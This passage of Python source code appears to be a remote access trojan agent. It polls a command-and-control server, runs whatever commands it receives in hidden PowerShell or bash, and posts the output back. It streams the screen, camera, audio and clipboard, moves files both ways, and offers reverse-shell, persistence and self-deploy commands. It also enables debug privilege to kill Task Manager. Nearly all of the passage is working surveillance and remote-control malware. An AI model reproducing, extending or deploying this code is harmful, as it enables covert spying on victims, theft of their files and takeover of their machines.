            return
        import mss
        with mss.mss() as sct:
            out = []
            for i, m in enumerate(sct.monitors[1:], start=1):
                w = int(m.get('width', (m['right'] - m['left'])))
                h = int(m.get('height', (m['bottom'] - m['top'])))
                out.append({'index': i, 'width': w, 'height': h, 'left': int(m['left']), 'top': int(m['top']), 'name': f'Monitor {i}', 'primary': i == 1})
        safe_emit('monitors_list', {'agent_id': agent_id, 'monitors': out})
    except Exception:
        try:
            safe_emit('monitors_list', {'agent_id': get_or_create_agent_id(), 'monitors': []})
        except Exception:
            pass

def on_switch_monitor(data):
    try:
        idx = int(data.get('monitor_index') or 1)
        if idx < 1:
            idx = 1
        global SELECTED_MONITOR_INDEX
        SELECTED_MONITOR_INDEX = idx
    except Exception:
        pass

def on_set_display_mode(data):
    try:
        mode = str(data.get('mode') or 'single')
        pm = data.get('pip_monitor')
        global DISPLAY_MODE, PIP_MONITOR_INDEX
        if mode in ('single', 'combined', 'pip'):
            DISPLAY_MODE = mode
        if pm is not None:
            try:
                PIP_MONITOR_INDEX = int(pm)
            except Exception:
                pass
    except Exception:
        pass

def on_set_audio_volumes(data):
    try:
        mv = float(data.get('mic_volume', 1.0))
        sv = float(data.get('system_volume', 1.0))
        mv = 0.0 if mv < 0.0 else (1.0 if mv > 1.0 else mv)
        sv = 0.0 if sv < 0.0 else (1.0 if sv > 1.0 else sv)
        global MIC_VOLUME, SYSTEM_VOLUME
        MIC_VOLUME = mv
        SYSTEM_VOLUME = sv
    except Exception:
        pass

def on_toggle_noise_reduction(data):
    try:
        en = bool(data.get('enabled', False))
        global NOISE_REDUCTION_ENABLED
        NOISE_REDUCTION_ENABLED = en
    except Exception:
        pass

def on_toggle_echo_cancellation(data):
    try:
        en = bool(data.get('enabled', False))
        global ECHO_CANCELLATION_ENABLED
        ECHO_CANCELLATION_ENABLED = en
    except Exception:
        pass
def handle_voice_playback(command_parts):
    """Handle voice playback from controller."""
    try:
        if len(command_parts) < 2:
            return "Invalid voice command format"
        
        audio_content_b64 = command_parts[1]
        
        # Decode base64 audio
        audio_content = base64.b64decode(audio_content_b64)
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
            temp_file.write(audio_content)
            temp_audio_path = temp_file.name
        
        # Initialize pygame mixer for audio playback
        pygame.mixer.init()
        pygame.mixer.music.load(temp_audio_path)
        pygame.mixer.music.play()
        
        # Wait for playback to finish
        while pygame.mixer.music.get_busy():
            time.sleep(0.1)
        
        # Clean up
        pygame.mixer.quit()
        os.unlink(temp_audio_path)
        
        return "Voice message played successfully"
    except Exception as e:
        return f"Voice playback failed: {e}"

def handle_live_audio(command_parts):
    """Handle live audio stream from controller microphone."""
    try:
        if len(command_parts) < 2:
            return "Invalid live audio command format"
        
        audio_content_b64 = command_parts[1]
        
        # Decode base64 audio
        audio_content = base64.b64decode(audio_content_b64)
        
        # Create temporary file for processing
        with tempfile.NamedTemporaryFile(suffix='.webm', delete=False) as temp_file:
            temp_file.write(audio_content)
            temp_audio_path = temp_file.name
        
        # Process audio with speech recognition if available
        if SPEECH_RECOGNITION_AVAILABLE:
            try:
                # Convert webm to wav for speech recognition
                import subprocess
                wav_path = temp_audio_path.replace('.webm', '.wav')
                
                if WINDOWS_AVAILABLE:
                    # Use ffmpeg if available, otherwise skip conversion
                    try:
                        subprocess.run(['ffmpeg', '-i', temp_audio_path, '-acodec', 'pcm_s16le', '-ar', '16000', wav_path], 
                                     check=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    except:
                        # If ffmpeg not available, try direct processing
                        wav_path = temp_audio_path
                else:
                    try:
                        subprocess.run(['ffmpeg', '-i', temp_audio_path, '-acodec', 'pcm_s16le', '-ar', '16000', wav_path], 
                                     check=True, capture_output=True)
                    except:
                        wav_path = temp_audio_path
                
                # Try to recognize speech
                recognizer = sr.Recognizer()
                try:
                    with sr.AudioFile(wav_path) as source:
                        audio = recognizer.record(source)
                    command = recognizer.recognize_google(audio).lower()
                    log_message(f"Live audio command received: {command}")
                    
                    # Process the voice command
                    if "screenshot" in command or "screen shot" in command:
                        execute_command("screenshot")
                    elif "open camera" in command or "start camera" in command:
                        start_camera_streaming(get_or_create_agent_id())
                    elif "close camera" in command or "stop camera" in command:
                        stop_camera_streaming()
                    elif "start streaming" in command or "start stream" in command:
                        start_streaming(get_or_create_agent_id())
                    elif "stop streaming" in command or "stop stream" in command:
                        stop_streaming()
                    elif "system info" in command or "system information" in command:
                        return execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a")
                    elif "list processes" in command or "show processes" in command:
                        if WINDOWS_AVAILABLE:
                            return execute_command("Get-Process | Select-Object Name, Id | Format-Table")
                        else:
                            return execute_command("ps aux")
                    elif "current directory" in command or "where am i" in command:
                        return execute_command("pwd")
                    elif command.startswith("run ") or command.startswith("execute "):
                        actual_command = command.split(" ", 1)[1] if " " in command else ""
                        if actual_command:
                            return execute_command(actual_command)
                    else:
                        log_message(f"Unknown live audio command: {command}")
                        
                except sr.UnknownValueError:
                    log_message("Could not understand live audio")
                except sr.RequestError as e:
                    log_message(f"Speech recognition error: {e}")
                    
                # Clean up wav file if created
                if wav_path != temp_audio_path and os.path.exists(wav_path):
                    os.unlink(wav_path)
                    
            except Exception as e:
                log_message(f"Live audio processing error: {e}")
        
        # Clean up temp file
        os.unlink(temp_audio_path)
        
        return "Live audio processed successfully"
    except Exception as e:
        return f"Live audio processing failed: {e}"
def format_command_output(output):
    """
    Format command output to preserve alignment and spacing.
    Wraps output in <pre> tags for proper monospace display.
    """
    if not output:
        return output
    
    # Wrap in <pre> tag to preserve formatting in HTML
    # This ensures columns stay aligned in web interface
    formatted = f"<pre style='font-family: Consolas, Monaco, \"Courier New\", monospace; white-space: pre; overflow-x: auto;'>{output}</pre>"
    return formatted

def execute_command(command):
    """Execute a command in PowerShell and return formatted output for UI v2.1"""
    # Use the new PowerShell formatting for UI v2.1
    return execute_in_powershell(command)
    
def execute_command_legacy(command):
    """Legacy execute command function (kept for reference)"""
    try:
        log_message(f"[PS] Executing: {command}", "info")
        
        # Check for incomplete/interactive commands
        interactive_commands = {
            'netsh': 'netsh wlan show profile\nnetsh interface show interface\nnetsh advfirewall show allprofiles',
            'diskpart': 'Use: list disk, list volume (diskpart requires interactive mode)',
            'wmic': 'wmic process list\nwmic os get caption\nwmic computersystem get model',
            'powercfg': 'powercfg /list\npowercfg /query\npowercfg /batteryreport',
            'reg': 'reg query HKLM\\Software\nreg query HKCU\\Software',
            'sc': 'sc query\nsc queryex type=service state=all'
        }
        
        # If command is just the tool name (no arguments), provide help
        cmd_lower = command.strip().lower()
        if cmd_lower in interactive_commands:
            help_msg = f"[i] '{command}' requires arguments.\n\nSuggested commands:\n{interactive_commands[cmd_lower]}\n\nTip: Type the full command on one line (e.g., 'netsh wlan show profile')"
            log_message(f"[PS] Interactive command detected: {command}", "info")
            return help_msg
        
        if platform.system() == "Windows":
            # SMART COMMAND DETECTION: Auto-translate Unix commands to Windows equivalents
            cmd_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cmd.exe')
            ps_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
                                      'WindowsPowerShell', 'v1.0', 'powershell.exe')
            
            # Get the first word of the command (the actual command, not arguments)
            cmd_parts = command.strip().split()
            first_word = cmd_parts[0].lower() if cmd_parts else ""
            
            # Unix command translations (convert to CMD equivalents)
            unix_to_cmd = {
                'ls': 'dir',
                'pwd': 'cd',
                'cat': 'type',
                'rm': 'del',
                'cp': 'copy',
                'mv': 'move',
                'clear': 'cls',
                'ps': 'tasklist',
                'kill': 'taskkill /PID',
                'grep': 'findstr',
                'which': 'where',
                'touch': 'type nul >',
                'head': 'more',
                'tail': 'more',
                'wget': 'curl',
                'curl': 'curl'
            }
            
            # Check if it's a Unix command that needs translation
            if first_word in unix_to_cmd:
                original_command = command
                # Replace the first word with the CMD equivalent
                translated = unix_to_cmd[first_word]
                if len(cmd_parts) > 1:
                    command = f"{translated} {' '.join(cmd_parts[1:])}"
                else:
                    command = translated
                log_message(f"[PS] Auto-translated: '{original_command}' -> '{command}'", "info")
            
            # PowerShell cmdlet detection
            powershell_keywords = [
                'Get-', 'Set-', 'New-', 'Remove-', 'Test-', 'Start-', 'Stop-', 'Invoke-',
                'Select-Object', 'Where-Object', 'ForEach-Object', 'Sort-Object',
                '$_', '$PSVersionTable', 'Import-Module', 'Export-', 'ConvertTo-',
                'Write-Host', 'Write-Output', 'Read-Host'
            ]
            is_powershell_cmdlet = any(keyword in command for keyword in powershell_keywords)
            
            # PowerShell-only commands (these MUST use PowerShell)
            powershell_only = [
                'get-process', 'get-service', 'get-childitem', 'get-content',
                'set-location', 'new-item', 'remove-item', 'copy-item', 'move-item'
            ]
            is_powershell_only = any(ps_cmd in first_word for ps_cmd in powershell_only)
            
            # Decide which shell to use
            use_powershell = is_powershell_cmdlet or is_powershell_only
            
            if use_powershell:
                # Use PowerShell for PowerShell-specific commands
                log_message(f"[PS] Using PowerShell: {ps_exe_path}", "debug")
                
                # PowerShell with proper output formatting
                # Add Out-String -Width 200 to preserve formatting
                formatted_command = f"{command} | Out-String -Width 200"
                
                result = subprocess.run(
                    [ps_exe_path, "-NoProfile", "-NonInteractive", "-Command", formatted_command],
                    capture_output=True,
                    text=False,  # Get bytes first for proper encoding detection
                    timeout=30,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    env=os.environ.copy()
                )
                
                # Decode with proper Windows console encoding
                try:
                    # Try UTF-8 first
                    stdout = result.stdout.decode('utf-8', errors='replace')
                    stderr = result.stderr.decode('utf-8', errors='replace')
                except:
                    # Fallback to Windows default encoding (cp1252 or cp437)
                    import locale
                    encoding = locale.getpreferredencoding() or 'cp437'
                    stdout = result.stdout.decode(encoding, errors='replace')
                    stderr = result.stderr.decode(encoding, errors='replace')
                
                # Create result-like object
                class Result:
                    pass
                result = Result()
                result.stdout = stdout
                result.stderr = stderr
                
            else:
                # Use CMD.exe for standard/translated commands
                log_message(f"[PS] Using CMD.exe: {cmd_exe_path}", "debug")
                
                # For CMD, capture bytes first for proper encoding
                result = subprocess.run(
                    [ps_exe_path, "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", command],  # Force UTF-8 output
                    capture_output=True,
                    text=False,  # Get bytes first
                    timeout=30,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    env=os.environ.copy()
                )
                
                # Decode with proper encoding
                try:
                    # Try UTF-8 (after chcp 65001)
                    stdout = result.stdout.decode('utf-8', errors='replace')
                    stderr = result.stderr.decode('utf-8', errors='replace')
                except:
                    # Fallback to Windows console encoding
                    try:
                        # Try cp437 (US English console)
                        stdout = result.stdout.decode('cp437', errors='replace')
                        stderr = result.stderr.decode('cp437', errors='replace')
                    except:
                        # Final fallback to cp1252 (Windows default)
                        stdout = result.stdout.decode('cp1252', errors='replace')
                        stderr = result.stderr.decode('cp1252', errors='replace')
                
                # Create result-like object
                class Result:
                    pass
                result = Result()
                result.stdout = stdout
                result.stderr = stderr
        else:
            # Use bash on Linux/Unix systems
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=30
            )
        
        # Safely combine stdout and stderr (handle None values)
        stdout = result.stdout if result.stdout else ""
        stderr = result.stderr if result.stderr else ""
        output = stdout + stderr
        
        if not output or output.strip() == "":
            output = "[No output from command]"
        
        log_message(f"[PS] Output: {output[:200]}{'...' if len(output) > 200 else ''}", "success")
        return output
        
    except subprocess.TimeoutExpired:
        error_msg = "[TIME] Command execution timed out after 30 seconds"
        log_message(error_msg, "error")
        return error_msg
    except FileNotFoundError as e:
        error_msg = f"[ X ] Executable not found: {e}"
        log_message(error_msg, "error")
        return error_msg
    except Exception as e:
        error_msg = f"[ X ] Command execution failed: {e}"
        log_message(error_msg, "error")
        return error_msg
def main_loop(agent_id):
    """The main command and control loop."""
    # Initialize high-performance systems
    low_latency_available = initialize_low_latency_input()
    
    internal_commands = {
        "start-stream": lambda: start_streaming(agent_id),
        "stop-stream": stop_streaming,
        "start-audio": lambda: start_audio_streaming(agent_id),
        "stop-audio": stop_audio_streaming,
        "start-camera": lambda: start_camera_streaming(agent_id),
        "stop-camera": stop_camera_streaming,
        "start-clipboard": lambda: start_clipboard_monitor(agent_id),
        "stop-clipboard": stop_clipboard_monitor,
        "start-reverse-shell": lambda: start_reverse_shell(agent_id),
        "stop-reverse-shell": stop_reverse_shell,
        "start-voice-control": lambda: start_voice_control(agent_id),
        "stop-voice-control": stop_voice_control,
        "kill-taskmgr": kill_task_manager,
        "pyinstaller": show_pyinstaller_instructions,
        "advanced-persistence": setup_advanced_persistence,
        "deploy-executable": deploy_executable_with_persistence,
        "self-deploy": self_deploy_powershell,
    }
    
    # Performance monitoring counter
    performance_check_counter = 0

    while True:
        try:
            if not REQUESTS_AVAILABLE:
                log_message("Requests library not available, cannot fetch tasks", "error")
                time.sleep(5)
                continue
                
            response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=10)
            task = response.json()
            command = task.get("command", "sleep")

            log_message(f"Received command: {command}")

            if command in internal_commands:
                try:
                    internal_commands[command]()
                    output = f"Internal command '{command}' executed successfully"
                except Exception as e:
                    output = f"Internal command '{command}' failed: {e}"
            elif command == "list-processes":
                try:
                    import psutil
                    proc_list = []
                    for p in psutil.process_iter(['pid','name','username','cpu_percent','memory_info','status','ppid','cmdline','create_time','nice','num_threads']):
                        info = p.info
                        proc_list.append({
                            'pid': info.get('pid'),
                            'name': info.get('name') or '',
                            'username': info.get('username') or '',
                            'cpu': float(info.get('cpu_percent') or 0.0),
                            'memory': float((getattr(info.get('memory_info'),'rss',0) or 0) / (1024*1024)),
                            'status': info.get('status') or 'running',
                            'ppid': info.get('ppid') or 0,
                            'cmdline': ' '.join(info.get('cmdline') or [])[:512],
                            'create_time': int(info.get('create_time') or 0)*1000,
                            'priority': 0,
                            'nice': info.get('nice') or 0,
                            'num_threads': info.get('num_threads') or 0,
                        })
                    safe_emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
                    output = f"Sent {len(proc_list)} processes"
                except Exception as e:
                    output = f"Error listing processes: {e}"
            elif command.startswith("list-dir"):
                try:
                    parts = command.split(":",1)
                    path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
                    try:
                        import os, re
                        if os.name == 'nt':
                            raw = str(path or '').strip()
                            if raw in ('', '/', '\\'):
                                path = os.environ.get('SystemDrive', 'C:') + '\\'
                            else:
                                m = re.match(r'^/?([A-Za-z]):[\\/]?$', raw)
                                if m:
                                    path = m.group(1).upper() + ':\\'
                                elif not re.match(r'^[A-Za-z]:', raw):
                                    if raw.startswith('/') or raw.startswith('\\'):
                                        drive = os.environ.get('SystemDrive', 'C:')
                                        path = os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
                                    else:
                                        path = os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
                                else:
                                    path = os.path.normpath(raw)
                        else:
                            path = os.path.normpath(path or '/')
                    except Exception:
                        pass
                    entries = []
                    if os.path.isdir(path):
                        for name in os.listdir(path):
                            full = os.path.join(path,name)
                            try:
                                stat = os.stat(full)
                                entries.append({
                                    'name': name,
                                    'type': 'directory' if os.path.isdir(full) else 'file',
                                    'size': int(stat.st_size),
                                    'modified': int(stat.st_mtime*1000),
                                    'path': full,
                                    'extension': (os.path.splitext(name)[1][1:] if os.path.isfile(full) else None)
                                })
                            except Exception:
                                continue
                        safe_emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
                        output = f"Listed {len(entries)} entries in {path}"
                    else:
                        safe_emit('file_list', {'agent_id': agent_id, 'path': path, 'success': False, 'error': 'Directory not found'})
                        output = f"Directory not found: {path}"
                except Exception as e:
                    output = f"Error listing directory: {e}"
            elif command.startswith("upload-file:"):
                # Split by first two colons: upload-file:path:content
                try:
                    parts = command.split(":", 2)
                    if len(parts) >= 3:
                        output = handle_file_upload(parts)
                    else:
                        output = "Invalid upload-file command format. Expected: upload-file:path:content"
                except Exception as e:
                    output = f"File upload error: {e}"
            elif command.startswith("download-file:"):
                # Split by first colon: download-file:path
                try:
                    parts = command.split(":", 1)
                    if len(parts) >= 2:
                        output = handle_file_download(parts, agent_id)
                    else:
                        output = "Invalid download-file command format. Expected: download-file:path"
                except Exception as e:
                    output = f"File download error: {e}"
            elif command.startswith("play-voice:"):
                try:
                    parts = command.split(":", 1)
                    output = handle_voice_playback(parts)
                except Exception as e:
                    output = f"Voice playback error: {e}"
            elif command.startswith("live-audio:"):
                try:
                    parts = command.split(":", 1)
                    output = handle_live_audio(parts)
                except Exception as e:
                    output = f"Live audio error: {e}"
            elif command.startswith("terminate-process:"):
                # Handle process termination with admin privileges
                try:
                    parts = command.split(":", 1)
                    if len(parts) > 1:
                        process_target = parts[1]
                        # Try to convert to int (PID) or use as string (process name)
                        try:
                            process_target = int(process_target)
                        except ValueError:
                            pass  # Keep as string (process name)
                        output = terminate_process_with_admin(process_target, force=True)
                    else:
                        output = "Invalid terminate-process command format"
                except Exception as e:
                    output = f"Process termination error: {e}"
            elif command.startswith("{") and "remote_control" in command:
                # Handle remote control commands (JSON format)
                try:
                    import json
                    command_data = json.loads(command)
                    if command_data.get("type") == "remote_control":
                        handle_remote_control(command_data)
                        output = "Remote control command executed"
                    else:
                        output = "Invalid remote control command format"
                except json.JSONDecodeError as e:
                    output = f"Invalid JSON in remote control command: {e}"
                except Exception as e:
                    output = f"Remote control command failed: {e}"
            elif command == "sleep":
                time.sleep(1)
                output = "Slept for 1 second"
            else:
                # Execute as system command
                try:
                    output = execute_command(command)
                except Exception as e:
                    output = f"Command execution error: {e}"
            
            # Send output back to server
            try:
                if REQUESTS_AVAILABLE:
                    response = requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output}, timeout=5)
                    if response.status_code != 200:
                        log_message(f"Warning: Server returned status {response.status_code} when posting output")
                else:
                    log_message("Cannot send output: requests library not available", "warning")
            except Exception as e:
                log_message(f"Failed to send output to server: {e}")
            
            # Performance monitoring
            performance_check_counter += 1
            if performance_check_counter >= 100:
                performance_check_counter = 0
                # Log performance stats occasionally
                if low_latency_available:
                    stats = get_input_performance_stats()
                    log_message(f"Performance stats: {stats}")
                    
        except requests.exceptions.RequestException as e:
            log_message(f"Network error in main loop: {e}")
            time.sleep(5)  # Wait before retrying
        except Exception as e:
            log_message(f"Error in main loop: {e}")
            time.sleep(1)  # Wait before retrying

# --- Process Termination Functions ---

def terminate_process_with_admin(process_name_or_pid, force=True):
    """Terminate a process with administrative privileges."""
    if not WINDOWS_AVAILABLE:
        return terminate_linux_process(process_name_or_pid, force)
    
    try:
        # First try to elevate if not already admin
        if not is_admin():
            log_message("Attempting to elevate privileges for process termination...")
            if not elevate_privileges():
                log_message("Could not elevate privileges. Trying alternative methods...")
                return terminate_process_alternative(process_name_or_pid, force)
        
        # Method 1: Use taskkill with admin privileges
        if isinstance(process_name_or_pid, str):
            # Process name provided
            cmd = ['taskkill', '/IM', process_name_or_pid]
        else:
            # PID provided
            cmd = ['taskkill', '/PID', str(process_name_or_pid)]
        
        if force:
            cmd.append('/F')
        
        # Add /T to terminate child processes
        cmd.append('/T')
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, 
                                  creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0)
            if result.returncode == 0:
                return f"Process terminated successfully: {result.stdout}"
            else:
                log_message(f"Taskkill failed: {result.stderr}")
                # Try alternative methods
                return terminate_process_alternative(process_name_or_pid, force)
        except Exception as e:
            log_message(f"Taskkill command failed: {e}")
            return terminate_process_alternative(process_name_or_pid, force)
            
    except Exception as e:
        log_message(f"Process termination failed: {e}")
        return f"Failed to terminate process: {e}"

def terminate_process_alternative(process_name_or_pid, force=True):
    """Alternative process termination methods using Windows API."""
    if not WINDOWS_AVAILABLE:
        return "Alternative termination not available on this platform"
    
    try:
        # Method 1: Direct Windows API termination
        if isinstance(process_name_or_pid, str):
            # Find process by name
            if not PSUTIL_AVAILABLE:
                return "Error: psutil not available"
                
            target_pids = []
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == process_name_or_pid.lower():
                    target_pids.append(proc.info['pid'])
        else:
            target_pids = [process_name_or_pid]
        
        if not target_pids:
            return f"Process not found: {process_name_or_pid}"
        
        terminated_count = 0
        for pid in target_pids:
            if terminate_process_by_pid(pid, force):
                terminated_count += 1
        
        if terminated_count > 0:
            return f"Successfully terminated {terminated_count} process(es)"
        else:
            return "Failed to terminate any processes"
            
    except Exception as e:
        return f"Alternative termination failed: {e}"

def terminate_process_by_pid(pid, force=True):
    """Terminate a specific process by PID using Windows API."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Method 1: Use TerminateProcess API
        process_handle = win32api.OpenProcess(
            win32con.PROCESS_TERMINATE | win32con.PROCESS_QUERY_INFORMATION,
            False,
            pid
        )
        
        if process_handle:
            try:
                # Get process name for logging
                try:
                    process_name = win32process.GetModuleFileNameEx(process_handle, 0)
                    log_message(f"Terminating process: {process_name} (PID: {pid})")
                except:
                    log_message(f"Terminating process PID: {pid}")
                
                # Terminate the process
                win32api.TerminateProcess(process_handle, 1)
                win32api.CloseHandle(process_handle)
                
                # Wait a moment and verify termination
                time.sleep(0.5)
                try:
                    psutil.Process(pid)
                    # Process still exists, try more aggressive methods
                    return terminate_process_aggressive(pid)
                except psutil.NoSuchProcess:
                    # Process terminated successfully
                    return True
                    
            except Exception as e:
                win32api.CloseHandle(process_handle)
                log_message(f"TerminateProcess failed for PID {pid}: {e}")
                return terminate_process_aggressive(pid)
        else:
            log_message(f"Could not open process handle for PID {pid}")
            return terminate_process_aggressive(pid)
            
    except Exception as e:
        log_message(f"Process termination by PID failed: {e}")
        return False

def terminate_process_aggressive(pid):
    """Aggressive process termination using advanced techniques."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Method 1: Use NtTerminateProcess (more direct)
        try:
            ntdll = ctypes.windll.ntdll
            kernel32 = ctypes.windll.kernel32
            
            # Open process with maximum access
            process_handle = kernel32.OpenProcess(0x1F0FFF, False, pid)  # PROCESS_ALL_ACCESS
            if process_handle:
                # Use NtTerminateProcess for more direct termination
                status = ntdll.NtTerminateProcess(process_handle, 1)
                kernel32.CloseHandle(process_handle)
                
                if status == 0:  # STATUS_SUCCESS
                    log_message(f"Process {pid} terminated using NtTerminateProcess")
                    return True
        except Exception as e:
            log_message(f"NtTerminateProcess failed: {e}")
        
        # Method 2: Debug privilege escalation and termination
        try:
            # Enable debug privilege
            enable_debug_privilege()
            
            # Try termination again with debug privilege
            process_handle = win32api.OpenProcess(
                win32con.PROCESS_TERMINATE,
                False,
                pid
            )
            
            if process_handle:
                win32api.TerminateProcess(process_handle, 1)
                win32api.CloseHandle(process_handle)
                log_message(f"Process {pid} terminated with debug privilege")
                return True
                
        except Exception as e:
            log_message(f"Debug privilege termination failed: {e}")
        
        # Method 3: Use psutil as last resort
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            proc.wait(timeout=3)
            log_message(f"Process {pid} terminated using psutil")
            return True
        except psutil.TimeoutExpired:
            try:
                proc.kill()
                log_message(f"Process {pid} killed using psutil")
                return True
            except:
                pass
        except Exception as e:
            log_message(f"Psutil termination failed: {e}")
        
        return False
        
    except Exception as e:
        log_message(f"Aggressive termination failed: {e}")
        return False

def enable_debug_privilege():
    """Enable debug privilege for the current process."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Get current process token
        token_handle = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        )
        
        # Get LUID for debug privilege
        debug_privilege = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
        
        # Enable the privilege
        privileges = [(debug_privilege, win32security.SE_PRIVILEGE_ENABLED)]
        win32security.AdjustTokenPrivileges(token_handle, False, privileges)
        
        win32api.CloseHandle(token_handle)
        log_message("Debug privilege enabled")
        return True
        
    except Exception as e:
        log_message(f"Failed to enable debug privilege: {e}")
        return False

def terminate_linux_process(process_name_or_pid, force=True):
    """Terminate process on Linux systems."""
    try:
        if isinstance(process_name_or_pid, str):
            # Use pkill for process name
            cmd = ['pkill']
            if force:
                cmd.append('-9')  # SIGKILL
            cmd.append(process_name_or_pid)
        else:
            # Use kill for PID
            cmd = ['kill']
            if force:
                cmd.append('-9')  # SIGKILL
            cmd.append(str(process_name_or_pid))
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            return f"Process terminated successfully"
        else:
            return f"Process termination failed: {result.stderr}"
            
    except Exception as e:
        return f"Linux process termination failed: {e}"

def kill_task_manager():
    """Specifically target and terminate Task Manager processes."""
    if not WINDOWS_AVAILABLE:
        return "Task Manager termination only available on Windows"
    
    try:
        task_manager_processes = ['taskmgr.exe', 'Taskmgr.exe', 'TASKMGR.EXE']
        results = []
        
        for process_name in task_manager_processes:
            try:
                result = terminate_process_with_admin(process_name, force=True)
                results.append(f"{process_name}: {result}")
            except Exception as e:
                results.append(f"{process_name}: Failed - {e}")
        
        # Also try to find and kill by PID
        if not PSUTIL_AVAILABLE:
            return "Error: psutil not available"
            
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == 'taskmgr.exe':
                    pid = proc.info['pid']
                    result = terminate_process_with_admin(pid, force=True)
                    results.append(f"PID {pid}: {result}")
        except Exception as e:
            results.append(f"PID search failed: {e}")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"Task Manager termination failed: {e}"

# Main execution logic is handled by agent_main() function at the end of the file

# ========================================================================================
# HIGH PERFORMANCE CAPTURE MODULE
# From: high_performance_capture.py
# ========================================================================================

#!/usr/bin/env python3
"""
High-Performance Screen Capture Module
Optimized for 60+ FPS streaming with sub-100ms latency
"""

# Platform-specific imports for high performance capture
if platform.system() == "Windows":
    try:
        import dxcam
        HAS_DXCAM = True
    except ImportError:
        HAS_DXCAM = False
else:
    HAS_DXCAM = False

try:
    from turbojpeg import TurboJPEG
    HAS_TURBOJPEG = True
except ImportError:
    HAS_TURBOJPEG = False

try:
    import lz4.frame
    HAS_LZ4 = True
except ImportError:
    HAS_LZ4 = False

try:
    import xxhash
    HAS_XXHASH = True
except ImportError:
    HAS_XXHASH = False

class HighPerformanceCapture:
    """High-performance screen capture optimized for real-time monitoring at 2 FPS (0.5-second intervals)"""
    
    def __init__(self, target_fps: int = 2, quality: int = 85, 
                 enable_delta_compression: bool = True):
        self.target_fps = target_fps
        self.frame_time = 1.0 / target_fps
        self.quality = quality
        self.enable_delta_compression = enable_delta_compression
        
        # Initialize capture backend
        self.capture_backend = None
        self._init_capture_backend()
        
        # Initialize compression
        self.turbo_jpeg = None
        if HAS_TURBOJPEG:
            try:
                # Suppress TurboJPEG warnings
                import warnings
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    self.turbo_jpeg = TurboJPEG()
                log_message(f"[OK] TurboJPEG initialized successfully")
            except Exception as e:
                # Don't show the detailed error message, just indicate it's not available
                log_message(f"[WARN] TurboJPEG not available, using fallback compression")
                self.turbo_jpeg = None
        
        # Frame management
        self.last_frame = None
        self.last_frame_hash = None
        self.frame_buffer = []
        self.buffer_size = 3  # Triple buffering
        
        # Statistics
        self.fps_counter = 0
        self.fps_start_time = time.time()
        self.actual_fps = 0
        
        self.running = False
        self.capture_thread = None
    
    def _init_capture_backend(self):
        """Initialize the best available capture backend for the platform"""
        if HAS_DXCAM and platform.system() == "Windows":
            try:
                self.capture_backend = dxcam.create(output_color="RGB")
                self.backend_type = "dxcam"
            except Exception as e:
                self._fallback_to_mss()
        else:
            self._fallback_to_mss()
    
    def _fallback_to_mss(self):
        """Fallback to MSS capture"""
        self.capture_backend = mss.mss()
        self.backend_type = "mss"
    
    def _get_backend_name(self) -> str:
        """Get the name of the current backend"""
        if hasattr(self, 'backend_type'):
            return self.backend_type.upper()
        return "Unknown"
    
    def capture_frame(self, region=None):
        """Capture a single frame with optimal performance"""
        try:
            if self.backend_type == "dxcam" and self.capture_backend:
                # DXcam capture (Windows only)
                if region:
                    frame = self.capture_backend.grab(region=region)
                else:
                    frame = self.capture_backend.grab()
                
                if frame is None:
                    return None
                    
                # DXcam returns RGB, no conversion needed
                return frame
                
            elif self.backend_type == "mss":
                # MSS capture
                if region:
                    monitor = {"left": region[0], "top": region[1], 
                              "width": region[2] - region[0], 
                              "height": region[3] - region[1]}
                else:
                    monitor = self.capture_backend.monitors[1]
                
                screenshot = self.capture_backend.grab(monitor)
                frame = np.array(screenshot)
                
                # Convert BGRA to RGB
                if frame.shape[2] == 4:
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2RGB)
                elif frame.shape[2] == 3:
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                
                return frame
                
        except Exception as e:
            return None
        
        return None
    
    def encode_frame(self, frame, force_keyframe: bool = False):
        """Encode frame with optimal compression"""
        if frame is None:
            return None
        
        try:
            # Delta compression check
            if self.enable_delta_compression and not force_keyframe:
                if HAS_XXHASH:
                    frame_hash = xxhash.xxh64(frame.tobytes()).hexdigest()
                    if frame_hash == self.last_frame_hash:
                        # No change, return empty data or delta marker
                        return b'DELTA_UNCHANGED'
                    self.last_frame_hash = frame_hash
            
            # Resize for performance if needed
            height, width = frame.shape[:2]
            if width > 1920:
                scale = 1920 / width
                new_width = int(width * scale)
                new_height = int(height * scale)
                frame = cv2.resize(frame, (new_width, new_height), 
                                 interpolation=cv2.INTER_AREA)
            
            # Use TurboJPEG if available (faster)
            if HAS_TURBOJPEG and self.turbo_jpeg:
                # Convert RGB to BGR for TurboJPEG
